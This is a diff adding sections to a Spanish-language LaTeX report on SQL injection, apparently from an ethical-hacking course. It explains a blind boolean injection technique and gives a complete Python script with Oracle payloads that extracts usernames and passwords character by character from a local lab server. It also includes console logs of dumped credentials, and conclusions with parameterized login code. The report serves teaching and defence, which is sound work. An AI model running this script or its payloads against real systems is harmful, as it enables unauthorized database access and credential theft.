+        if keyword.lower() in response.text.lower():
+            return True
+    return False
+\end{lstlisting}
+
+\textbf{Descripción de la función:}
+\begin{itemize}
+    \item \texttt{payload}: La inyección SQL a enviar.
+    \item \texttt{SERVER\_URL}: La URL del servidor configurada para recibir las peticiones.
+    \item \texttt{success\_keywords}: Lista de palabras clave que indican un cambio visible en la respuesta (por ejemplo, el mensaje "Bienvenido de nuevo").
+\end{itemize}
+
+El script interpreta que la inyección fue exitosa si detecta alguno de los cambios definidos por \texttt{success\_keywords}.
+
+\subsubsection{Determinación de la longitud de un campo}
+
+Antes de extraer el valor completo de un campo, el script determina su longitud, iterando sobre posibles valores hasta encontrar una coincidencia.
+
+\begin{lstlisting}[language=Python]
+def obtener_longitud_por_fila(campo, indice, max_length=40):
+    """
+    Determina la longitud de un campo específico para una fila específica en la base de datos.
+    """
+    for longitud in range(1, max_length + 1):
+        payload = (
+            f"d382yd8n21df4314fn817yf6834188ls023d8d' "
+            f"AND (SELECT CASE WHEN (LENGTH({campo}) = {longitud}) THEN 1 ELSE 1/0 END "
+            f"FROM (SELECT {campo}, ROWNUM AS rn FROM Usuarios) WHERE rn={indice}) = 1 --"
+        )
+        if enviar_inyeccion(payload):
+            return longitud
+    return 0
+\end{lstlisting}
+
+\textbf{Descripción de la función:}
+\begin{itemize}
+    \item \texttt{max\_length}: Longitud máxima del campo a probar.
+    \item La función construye y envía inyecciones SQL con diferentes longitudes hasta que la base de datos devuelve una respuesta positiva.
+    \item Si no se encuentra una longitud dentro del rango \texttt{max\_length}, se asume que los datos están fuera de los límites definidos.
+\end{itemize}
+
+\subsubsection{Extracción del valor carácter por carácter}
+
+Después de determinar la longitud de un campo, el script extrae su valor carácter por carácter, iterando sobre un conjunto predefinido de caracteres posibles.
+
+\begin{lstlisting}[language=Python]
+def extraer_campo(campo, longitud, indice):
+    """
+    Extrae el valor del campo especificado carácter por carácter para una fila específica.
+    """
+    resultado = ""
+    caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
+    for pos in range(1, longitud + 1):
+        for caracter in caracteres:
+            inyeccion = construir_inyeccion(campo, pos, caracter, indice)
+            if enviar_inyeccion(inyeccion):
+                resultado += caracter
+                break
+    return resultado
+\end{lstlisting}
+
+\textbf{Descripción de la función:}
+\begin{itemize}
+    \item \texttt{longitud}: Longitud del campo a extraer.
+    \item \texttt{caracteres}: Conjunto de caracteres posibles que se probarán (letras, números y símbolos).
+    \item La función construye un payload para cada posición del campo y cada carácter, identificando cuál produce un cambio en la respuesta del servidor.
+\end{itemize}
+
+\subsubsection{Menú interactivo y flujo principal}
+
+El script presenta un menú interactivo que permite al usuario elegir entre dumpear los usuarios o las contraseñas de la base de datos.
+
+\begin{lstlisting}[language=Python]
+def menu():
+    """
+    Muestra el menú interactivo para que el usuario seleccione el campo a extraer.
+    """
+    print("Selecciona qué deseas extraer de la BD:")
+    print("1. Usuarios")
+    print("2. Contraseñas")
+    while True:
+        opcion = input("Opción (1 o 2): ").strip()
+        if opcion == "1":
+            return "username"
+        elif opcion == "2":
+            return "password"
+\end{lstlisting}
+
+El flujo principal coordina las operaciones para extraer todos los valores de un campo:
+
+\begin{lstlisting}[language=Python]
+def main():
+    campo = menu()
+    resultados = extraer_todos_los_campos(campo)
+    for i, resultado in enumerate(resultados, start=1):
+        print(f"Fila {i}: {resultado}")
+\end{lstlisting}
+
+\textbf{Nota:} En esta sección se han omitido detalles específicos del script para simplificar la explicación. Tanto el código completo del script como la salida de su ejecución en consola se encuentran en el \textbf{anexo} (\ref{sec:anexo}) para su consulta.
 
 
 %-----------------------------------------------------------------------------------------------
 
 
-
 \section{Inyección Blind basada en tiempo}
-
 
 La inyección SQL basada en tiempo es una técnica utilizada para explotar vulnerabilidades en aplicaciones que interactúan con bases de datos. Este tipo de ataque pertenece a la categoría de \textbf{inyección SQL ciega} y se caracteriza por depender del tiempo de respuesta del servidor para deducir información de la base de datos.
 
@@ -1871,7 +2467,721 @@ Estas tres variantes ilustran cómo el atacante, combinando condiciones lógicas
 
 
 %Conclusiones (mostrar código de login seguro)
+\section{Conclusiones}
+
+En este documento se ha abordado de manera detallada el tema de las inyecciones SQL como una de las vulnerabilidades más críticas en aplicaciones web que interactúan con bases de datos. A través del análisis de diferentes técnicas de ataque, como las inyecciones basadas en UNION y las basadas en booleanos, se ha evidenciado la facilidad con la que una aplicación mal diseñada puede ser explotada, lo que resalta la importancia de implementar medidas de seguridad adecuadas.
+
+\vspace{0,5cm}
+
+El desarrollo de un laboratorio interactivo permitió explorar estas vulnerabilidades de manera práctica, proporcionando un entorno seguro para entender cómo ocurren los ataques, cuáles son sus impactos y cómo se pueden prevenir. Este enfoque práctico ha sido clave para comprender que la prevención de inyecciones SQL no es solo una cuestión técnica, sino también un compromiso con el diseño de sistemas seguros desde las primeras etapas del desarrollo.
+
+\vspace{0,5cm}
+
+Entre las principales conclusiones, se destaca que la principal causa de las inyecciones SQL es la mala validación de las entradas de usuario, como el uso de consultas dinámicas construidas mediante concatenación de parámetros. Este fallo permite a los atacantes manipular consultas y obtener acceso no autorizado a información sensible. Sin embargo, se demostró que técnicas como la vinculación de parámetros y el uso de consultas preparadas son soluciones efectivas para mitigar estos riesgos.
+
+\vspace{0,5cm}
+
+\begin{lstlisting}[language=Python]
+def login_seguro_oracle(username, password):
+    print("---login---")
+    print("login_seguro")
+    conexion = dbConectarOracle()
+    if not conexion:
+        print("Error: no se pudo conectar para autenticar.")
+        return False
+
+    try:
+        cursor = conexion.cursor()
+        cursor.execute("SELECT * FROM Usuarios WHERE username = :user AND password = :pass", (username, password))
+        usuario = cursor.fetchone()
+        cursor.close()
+        if usuario:
+            print("Usuario autenticado:", usuario)
+            return True
+        else:
+            print("Usuario o contraseña incorrectos")
+            return False
+    except PBD.DatabaseError as error:
+        print("Error al autenticar usuario")
+        print(error)
+        return False
+\end{lstlisting}
+
+\vspace{0,5cm}
+
+\begin{lstlisting}[language=Python]
+def login_seguro_postgresql(username, password):
+print("---login---")
+conexion = dbConectarPostgreSQL()  # Abre la conexión para autenticación
+if not conexion:
+    print("Error: no se pudo conectar para autenticar.")
+    return False
+
+try:
+    cursor = conexion.cursor()
+    consulta = "SELECT * FROM Usuarios WHERE username = %s AND password = %s"
+    cursor.execute(consulta, [username, password])
+    usuario = cursor.fetchone()
+    cursor.close()
+    dbDesconectar(conexion)  # Cierra la conexión después de la autenticación
+    if usuario:
+        print("Usuario autenticado:", usuario)
+        return True
+    else:
+        print("Usuario o contraseña incorrectos")
+        return False
+except PBD.DatabaseError as error:
+    print("Error al autenticar usuario")
+    print(error)
+    dbDesconectar(conexion)
+    return False
+\end{lstlisting}
+
+\vspace{0,5cm}
+
+
+
+Además, el principio de privilegios mínimos en las cuentas de base de datos y la auditoría constante de las aplicaciones también fueron identificados como medidas críticas para limitar el impacto de posibles ataques. La combinación de estas prácticas de desarrollo seguro con la educación y la concienciación sobre ciberseguridad es esencial para enfrentar las amenazas actuales.
+
+\vspace{0,5cm}
+
+En conclusión, este trabajo subraya la importancia de entender y mitigar las inyecciones SQL en el contexto del hacking ético y la seguridad de bases de datos. No solo se trata de proteger los datos de las organizaciones y sus usuarios, sino también de garantizar la confianza en las aplicaciones que forman parte del mundo digital. Este esfuerzo requiere un enfoque continuo en la mejora de las prácticas de desarrollo y la adopción de medidas de seguridad robustas como parte integral del ciclo de vida del software.
+
+
+
 %Anexo (Cajon desastre para codigo completo, ejecuciones completas, etc)
+\section{Anexo}
+\label{sec:anexo}
+A continuación se presenta el código completo del script de Python desarrollado para automatizar inyecciones \textbf{Blind Boolean}.
+
+\subsection{Código completo del script}
+
+\begin{lstlisting}[language=Python, basicstyle=\ttfamily\footnotesize]
+import requests
+from termcolor import colored
+from yaspin import yaspin
+import string
+import signal
+import sys
+import time
+
+
+# Controlar CTRL+C para una salida limpia
+def signal_handler(sig, frame):
+    print(colored('\n[!] Interrupción por el usuario. Saliendo...', "red"))
+    sys.exit(0)
+
+
+signal.signal(signal.SIGINT, signal_handler)
+
+# Configuración del servidor
+SERVER_URL = "http://127.0.0.1:5000/cookie"  # Endpoint para inyecciones booleanas
+
+
+def construir_inyeccion(campo, posicion, caracter, indice):
+    """
+    Construye el payload de inyección SQL para extraer un carácter específico de una fila específica.
+    """
+    # Escapar apóstrofes en el carácter
+    caracter_escapado = caracter.replace("'", "''")
+
+    # Construir el payload para una fila específica
+    payload = (
+        f"d382yd8n21df4314fn817yf6834188ls023d8d' "
+        f"AND (SELECT CASE WHEN (SUBSTR({campo}, {posicion}, 1) = '{caracter_escapado}') "
+        f"THEN 1 ELSE 1/0 END FROM (SELECT {campo}, ROWNUM AS rn FROM Usuarios) WHERE rn={indice}) = 1 --"
+    )
+
+    return payload
+
+
+def enviar_inyeccion(payload):
+    """
+    Envía la inyección al servidor y devuelve True si se detecta un cambio en la web, False en caso contrario.
+    """
+    data = {
+        "tipo_sqli": "blind_boolean",
+        "database": "Oracle",
+        "cookie_value": payload
+    }
+
+    try:
+        time.sleep(0.1)  # Opcional: Añadir un pequeño retraso para no sobrecargar el servidor
+        response = requests.post(SERVER_URL, json=data, timeout=5, allow_redirects=True)
+
+        # Lista de palabras clave que indican un cambio en la web
+        success_keywords = ["Bienvenido de nuevo"]
+        for keyword in success_keywords:
+            if keyword.lower() in response.text.lower():
+                return True
+        return False
+    except requests.exceptions.Timeout:
+        print(colored("[!] Timeout durante la solicitud", "red"))
+        return False
+    except requests.exceptions.RequestException as e:
+        print(colored(f"[!] Error en la petición: {e}", "red"))
+        return False
+
+
+def obtener_longitud_por_fila(campo, indice, max_length=40): # Asumimos que como máximo un campo tendrá 40 caracteres
+    """
+    Determina la longitud de un campo específico para una fila específica en la base de datos.
+    """
+    print(colored(f"\n[+] Determinando la longitud de '{campo}' para la fila {indice}...", "yellow"))
+    for longitud in range(1, max_length + 1):
+        # Construir el payload con el índice de la fila
+        payload = (
+            f"d382yd8n21df4314fn817yf6834188ls023d8d' "
+            f"AND (SELECT CASE WHEN (LENGTH({campo}) = {longitud}) THEN 1 ELSE 1/0 END FROM "
+            f"(SELECT {campo}, ROWNUM AS rn FROM Usuarios) WHERE rn={indice}) = 1 --"
+        )
+        with yaspin(text=f"Probando longitud {longitud} para la fila {indice}...", color=None, attrs=None) as spinner:
+            time.sleep(0.1)  # Reducir la carga en el servidor
+            if enviar_inyeccion(payload):
+                spinner.ok("OK")
+                print(colored(f"[*] La longitud de '{campo}' en la fila {indice} es: {longitud}", "green"))
+                return longitud
+            else:
+                spinner.fail("FAIL")
+    print(colored(f"[!] No se pudo determinar la longitud de '{campo}' en la fila {indice}.", "red"))
+    return 0
+
+
+def extraer_campo(campo, longitud, indice):
+    """
+    Extrae el valor del campo especificado carácter por carácter para una fila específica.
+    """
+    resultado = ""
+    # Limitar el conjunto de caracteres a probar para mayor eficiencia
+    caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
+    print(colored(f"\n[+] Extrayendo el valor de '{campo}' para la fila {indice}...", "yellow"))
+
+    for pos in range(1, longitud + 1):
+        encontrado = False
+        print(colored(f"\n[+] Extrayendo carácter {pos} de {longitud} para la fila {indice}...", "cyan"))
+        with yaspin(text=f"Probando carácter en posición {pos}...", color=None, attrs=None) as spinner:
+            for caracter in caracteres:
+                inyeccion = construir_inyeccion(campo, pos, caracter, indice)
+                if enviar_inyeccion(inyeccion):
+                    resultado += caracter
+                    spinner.text = f"Carácter {pos}: '{caracter}' encontrado."
+                    spinner.ok("OK")
+                    print(colored(f"[+] Inyección utilizada: {inyeccion}", "cyan"))
+                    encontrado = True
+                    break
+                time.sleep(0.05)  # Opcional: Reducir la carga en el servidor
+            if not encontrado:
+                spinner.fail("FAIL")
+                print(colored(f"[!] No se encontró un carácter coincidente en la posición {pos}.", "red"))
+                resultado += '?'
+    return resultado
+
+
+def extraer_todos_los_campos(campo, max_filas=10):
+    """
+    Extrae todos los valores del campo especificado, iterando sobre todas las filas de la tabla.
+    """
+    resultados = []
+    for indice in range(1, max_filas + 1):
+        print(colored(f"\n[+] Extrayendo datos para la fila {indice}...", "yellow"))
+        # Usar la nueva función para determinar la longitud de esta fila específica
+        longitud = obtener_longitud_por_fila(campo, indice)
+        if longitud == 0:
+            print(colored(f"[!] No se encontró longitud para la fila {indice}. Asumiendo fin de datos.", "red"))
+            break
+        # Extraer el valor de esta fila específica
+        valor = extraer_campo(campo, longitud, indice)
+        resultados.append(valor)
+        print(colored(f"[+] Valor extraído para la fila {indice}: {valor}", "green"))
+    return resultados
+
+def mostrar_banner():
+    print(colored("   ___  ___         __    ___            __            ", "cyan"))
+    print(colored("  / _ )/ (_)__  ___/ /   / _ )___  ___  / /__ ___ ____ ", "cyan"))
+    print(colored(" / _  / / / _ \\/ _  /   / _  / _ \\/ _ \\/ / -_) _ `/ _ \\", "cyan"))
+    print(colored("/____/_/_/_//_/\\_,_/   /____/\\___/\\___/_/\\__/\\_,_/_//_/", "cyan"))
+    print(colored("   ________    __   ____       ____        _      __      ", "yellow"))
+    print(colored("  / __/ __ \\  / /  /  _/      / __/_______(_)__  / /_     ", "yellow"))
+    print(colored(" _\\ \\/ /_/ / / /___/ /      _\\ \\/ __/ __/ / _ \\/ __/     ", "yellow"))
+    print(colored("/___/\\___\\_\\/____/___/     /___/\\__/_/ /_/ .__/\\__/      ", "yellow"))
+    print(colored("                                        /_/             ", "yellow"))
+
+def menu():
+    """
+    Muestra el menú interactivo para que el usuario seleccione el campo a extraer.
+    """
+    mostrar_banner()
+    print(colored("Selecciona qué deseas extraer de la BD:", "yellow"))
+    print(colored("1. Usuarios", "magenta"))
+    print(colored("2. Contraseñas", "magenta"))
+
+    while True:
+        opcion = input("Opción (1 o 2): ").strip()
+        if opcion == "1":
+            campo = "username"
+            break
+        elif opcion == "2":
+            campo = "password"
+            break
+        else:
+            print(colored("[!] Introduce una opción válida (1 o 2).", "red"))
+
+    return campo
+
+
+def main():
+    """
+    Función principal que coordina el proceso de inyección SQL para extraer múltiples filas.
+    """
+    start_time = time.time()
+    campo = menu()
+    resultados = extraer_todos_los_campos(campo)
+    print(colored("\n[+] Resultados completos:", "blue", attrs=["bold"]))
+    for i, resultado in enumerate(resultados, start=1):
+        if campo == "username":
+            print(colored(f"Usuario {i}: {resultado}", "cyan"))
+        else:
+            print(colored(f"Contraseña {i}: {resultado}", "green"))
+
+    print(colored(f"\n[+] Tiempo de ejecución: {round(time.time() - start_time, 2)} segundos", "blue", attrs=["bold"]))
+
+
+if __name__ == "__main__":
+    main()
+\end{lstlisting}
+
+\subsection{Ejecución completa del script dumpeando usuarios}
+A continuación se muestra la ejecución completa del script para extraer los nombres de usuario de la base de datos.
+
+\begin{lstlisting}[style=console, basicstyle=\ttfamily\footnotesize]
+    ___  ___         __    ___            __            
+   / _ )/ (_)__  ___/ /   / _ )___  ___  / /__ ___ ____ 
+  / _  / / / _ \/ _  /   / _  / _ \/ _ \/ / -_) _ `/ _ \
+ /____/_/_/_//_/\_,_/   /____/\___/\___/_/\__/\_,_/_//_/
+    ________    __   ____       ____        _      __      
+   / __/ __ \  / /  /  _/      / __/_______(_)__  / /_     
+  _\ \/ /_/ / / /___/ /      _\ \/ __/ __/ / _ \/ __/     
+ /___/\___\_\/____/___/     /___/\__/_/ /_/ .__/\__/      
+                                         /_/             
+ Selecciona qué deseas extraer de la BD:
+ 1. Usuarios
+ 2. Contraseñas
+ Opción (1 o 2): 1
+ 
+ [+] Extrayendo datos para la fila 1...
+ 
+ [+] Determinando la longitud de 'username' para la fila 1...
+ FAIL Probando longitud 1 para la fila 1...
+ FAIL Probando longitud 2 para la fila 1...
+ FAIL Probando longitud 3 para la fila 1...
+ FAIL Probando longitud 4 para la fila 1...
+ OK Probando longitud 5 para la fila 1...
+ [*] La longitud de 'username' en la fila 1 es: 5
+ 
+ [+] Extrayendo el valor de 'username' para la fila 1...
+ 
+ [+] Extrayendo carácter 1 de 5 para la fila 1...
+ OK Carácter 1: 'a' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 2 de 5 para la fila 1...
+ OK Carácter 2: 'd' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 2, 1) = 'd') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 3 de 5 para la fila 1...
+ OK Carácter 3: 'm' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 3, 1) = 'm') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 4 de 5 para la fila 1...
+ OK Carácter 4: 'i' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 4, 1) = 'i') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 5 de 5 para la fila 1...
+ OK Carácter 5: 'n' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 5, 1) = 'n') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ [+] Valor extraído para la fila 1: admin
+ 
+ [+] Extrayendo datos para la fila 2...
+ 
+ [+] Determinando la longitud de 'username' para la fila 2...
+ FAIL Probando longitud 1 para la fila 2...
+ FAIL Probando longitud 2 para la fila 2...
+ FAIL Probando longitud 3 para la fila 2...
+ FAIL Probando longitud 4 para la fila 2...
+ OK Probando longitud 5 para la fila 2...
+ [*] La longitud de 'username' en la fila 2 es: 5
+ 
+ [+] Extrayendo el valor de 'username' para la fila 2...
+ 
+ [+] Extrayendo carácter 1 de 5 para la fila 2...
+ OK Carácter 1: 'u' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'u') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 2 de 5 para la fila 2...
+ OK Carácter 2: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 2, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 3 de 5 para la fila 2...
+ OK Carácter 3: 'e' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 3, 1) = 'e') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 4 de 5 para la fila 2...
+ OK Carácter 4: 'r' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 4, 1) = 'r') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 5 de 5 para la fila 2...
+ OK Carácter 5: '1' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 5, 1) = '1') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ [+] Valor extraído para la fila 2: user1
+ 
+ [+] Extrayendo datos para la fila 3...
+ 
+ [+] Determinando la longitud de 'username' para la fila 3...
+ FAIL Probando longitud 1 para la fila 3...
+ FAIL Probando longitud 2 para la fila 3...
+ FAIL Probando longitud 3 para la fila 3...
+ FAIL Probando longitud 4 para la fila 3...
+ OK Probando longitud 5 para la fila 3...
+ [*] La longitud de 'username' en la fila 3 es: 5
+ 
+ [+] Extrayendo el valor de 'username' para la fila 3...
+ 
+ [+] Extrayendo carácter 1 de 5 para la fila 3...
+ OK Carácter 1: 'u' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'u') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 2 de 5 para la fila 3...
+ OK Carácter 2: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 2, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 3 de 5 para la fila 3...
+ OK Carácter 3: 'e' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 3, 1) = 'e') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 4 de 5 para la fila 3...
+ OK Carácter 4: 'r' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 4, 1) = 'r') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 5 de 5 para la fila 3...
+ OK Carácter 5: '2' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 5, 1) = '2') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ [+] Valor extraído para la fila 3: user2
+ 
+ [+] Extrayendo datos para la fila 4...
+ 
+ [+] Determinando la longitud de 'username' para la fila 4...
+ FAIL Probando longitud 1 para la fila 4...
+ FAIL Probando longitud 2 para la fila 4...
+ FAIL Probando longitud 3 para la fila 4...
+ FAIL Probando longitud 4 para la fila 4...
+ FAIL Probando longitud 5 para la fila 4...
+ FAIL Probando longitud 6 para la fila 4...
+ FAIL Probando longitud 7 para la fila 4...
+ FAIL Probando longitud 8 para la fila 4...
+ FAIL Probando longitud 9 para la fila 4...
+ FAIL Probando longitud 10 para la fila 4...
+ FAIL Probando longitud 11 para la fila 4...
+ FAIL Probando longitud 12 para la fila 4...
+ FAIL Probando longitud 13 para la fila 4...
+ FAIL Probando longitud 14 para la fila 4...
+ FAIL Probando longitud 15 para la fila 4...
+ FAIL Probando longitud 16 para la fila 4...
+ FAIL Probando longitud 17 para la fila 4...
+ FAIL Probando longitud 18 para la fila 4...
+ FAIL Probando longitud 19 para la fila 4...
+ FAIL Probando longitud 20 para la fila 4...
+ FAIL Probando longitud 21 para la fila 4...
+ FAIL Probando longitud 22 para la fila 4...
+ FAIL Probando longitud 23 para la fila 4...
+ FAIL Probando longitud 24 para la fila 4...
+ FAIL Probando longitud 25 para la fila 4...
+ FAIL Probando longitud 26 para la fila 4...
+ FAIL Probando longitud 27 para la fila 4...
+ FAIL Probando longitud 28 para la fila 4...
+ FAIL Probando longitud 29 para la fila 4...
+ FAIL Probando longitud 30 para la fila 4...
+ FAIL Probando longitud 31 para la fila 4...
+ FAIL Probando longitud 32 para la fila 4...
+ FAIL Probando longitud 33 para la fila 4...
+ FAIL Probando longitud 34 para la fila 4...
+ FAIL Probando longitud 35 para la fila 4...
+ FAIL Probando longitud 36 para la fila 4...
+ FAIL Probando longitud 37 para la fila 4...
+ FAIL Probando longitud 38 para la fila 4...
+ FAIL Probando longitud 39 para la fila 4...
+ FAIL Probando longitud 40 para la fila 4...
+ [!] No se pudo determinar la longitud de 'username' en la fila 4.
+ [!] No se encontró longitud para la fila 4. Asumiendo fin de datos.
+ 
+ [+] Resultados completos:
+ Usuario 1: admin
+ Usuario 2: user1
+ Usuario 3: user2
+ 
+ [+] Tiempo de ejecución: 89.42 segundos
+\end{lstlisting}
+
+\subsection{Ejecución completa del script dumpeando contraseñas}
+A continuación se muestra la ejecución completa del script para extraer las contraseñas de la base de datos.
+
+\begin{lstlisting}[style=console, basicstyle=\ttfamily\footnotesize]
+    ___  ___         __    ___            __            
+   / _ )/ (_)__  ___/ /   / _ )___  ___  / /__ ___ ____ 
+  / _  / / / _ \/ _  /   / _  / _ \/ _ \/ / -_) _ `/ _ \
+ /____/_/_/_//_/\_,_/   /____/\___/\___/_/\__/\_,_/_//_/
+    ________    __   ____       ____        _      __      
+   / __/ __ \  / /  /  _/      / __/_______(_)__  / /_     
+  _\ \/ /_/ / / /___/ /      _\ \/ __/ __/ / _ \/ __/     
+ /___/\___\_\/____/___/     /___/\__/_/ /_/ .__/\__/      
+                                         /_/             
+ Selecciona qué deseas extraer de la BD:
+ 1. Usuarios
+ 2. Contraseñas
+ Opción (1 o 2): 2
+ 
+ [+] Extrayendo datos para la fila 1...
+ 
+ [+] Determinando la longitud de 'password' para la fila 1...
+ FAIL Probando longitud 1 para la fila 1...
+ FAIL Probando longitud 2 para la fila 1...
+ FAIL Probando longitud 3 para la fila 1...
+ FAIL Probando longitud 4 para la fila 1...
+ FAIL Probando longitud 5 para la fila 1...
+ FAIL Probando longitud 6 para la fila 1...
+ FAIL Probando longitud 7 para la fila 1...
+ FAIL Probando longitud 8 para la fila 1...
+ FAIL Probando longitud 9 para la fila 1...
+ FAIL Probando longitud 10 para la fila 1...
+ OK Probando longitud 11 para la fila 1...
+ [*] La longitud de 'password' en la fila 1 es: 11
+ 
+ [+] Extrayendo el valor de 'password' para la fila 1...
+ 
+ [+] Extrayendo carácter 1 de 11 para la fila 1...
+ OK Carácter 1: 'p' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'p') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 2 de 11 para la fila 1...
+ OK Carácter 2: 'a' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 2, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 3 de 11 para la fila 1...
+ OK Carácter 3: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 3, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 4 de 11 para la fila 1...
+ OK Carácter 4: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 4, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 5 de 11 para la fila 1...
+ OK Carácter 5: 'w' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 5, 1) = 'w') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 6 de 11 para la fila 1...
+ OK Carácter 6: 'o' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 6, 1) = 'o') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 7 de 11 para la fila 1...
+ OK Carácter 7: 'r' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 7, 1) = 'r') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 8 de 11 para la fila 1...
+ OK Carácter 8: 'd' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 8, 1) = 'd') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 9 de 11 para la fila 1...
+ OK Carácter 9: '1' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 9, 1) = '1') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 10 de 11 para la fila 1...
